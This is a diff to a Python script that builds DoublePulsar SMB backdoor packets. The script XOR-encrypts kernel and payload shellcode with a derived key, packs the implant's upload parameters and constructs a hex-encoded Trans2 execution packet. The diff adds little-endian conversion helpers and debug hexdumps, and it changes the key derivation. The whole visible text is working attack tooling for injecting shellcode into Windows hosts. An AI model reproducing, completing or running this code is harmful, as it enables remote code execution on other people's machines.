@@ -114,7 +114,31 @@ def byte_xor(data, key):
     for i in range(len(data)):
         data[i] ^= key[i % len(key)]
     return data
-  
+
+#https://github.com/bjornedstrom/elliptic-curve-chemistry-set/blob/master/eddsa.py
+def le2int(buf):
+    """little endian buffer to integer."""
+    integer = 0
+    shift = 0
+    for byte in buf:
+        integer |= ord(byte) << shift
+        shift += 8
+    return integer
+
+def int2le(integer, pad):
+    """integer to little endian buffer."""
+    buf = []
+    while integer:
+        buf.append(chr(integer & 0xff))
+        integer >>= 8
+        pad -= 1
+    while pad > 0:
+        buf.append('\x00')
+        pad -= 1
+    if not buf:
+        return '\x00'
+    return ''.join(buf)
+
 if __name__ == "__main__":
 
     # Packets
@@ -186,6 +210,14 @@ if __name__ == "__main__":
         packed_xor_key = struct.pack('<I', xor_key)
         #print(packed_xor_key)
 
+        print(hexdump(packed_xor_key))
+        int_bytes_xor_key = int(key)
+        bytes_xor_key = int2le(int_bytes_xor_key, 0)
+        b_bytes_xor_key = bytes(bytes_xor_key.encode())
+        print(hexdump(b_bytes_xor_key))
+        print(hexdump(packed_xor_key))
+        print(packed_xor_key)
+
         #generate the final payload shellcode first
         modified_kernel_shellcode = bytearray(kernel_shellcode)
         bytes_payload_shellcode = bytearray(payload_shellcode)
@@ -216,7 +248,7 @@ if __name__ == "__main__":
         
         #xor the payload data now
         print("encrypting the shellcode with the XOR key")
-        byte_xor(modified_kernel_shellcode, packed_xor_key)
+        byte_xor(modified_kernel_shellcode, b_bytes_xor_key)
         
         #build the doublepulsar parameters
         EntireShellcodeSize = len(modified_kernel_shellcode)
@@ -235,7 +267,7 @@ if __name__ == "__main__":
         parameters += ChunkSize
         parameters += offset
         parameters_bytearray = bytearray(parameters)
-        byte_xor(parameters_bytearray, packed_xor_key)
+        byte_xor(parameters_bytearray, b_bytes_xor_key)
         
         #build the execution packet
         trans2_exec_packet = binascii.unhexlify("0000104eff534d4232000000001807c00000000000000000000000000008fffe000842000f0c000010010000000000000025891a0000000c00420000104e0001000e000d1000")
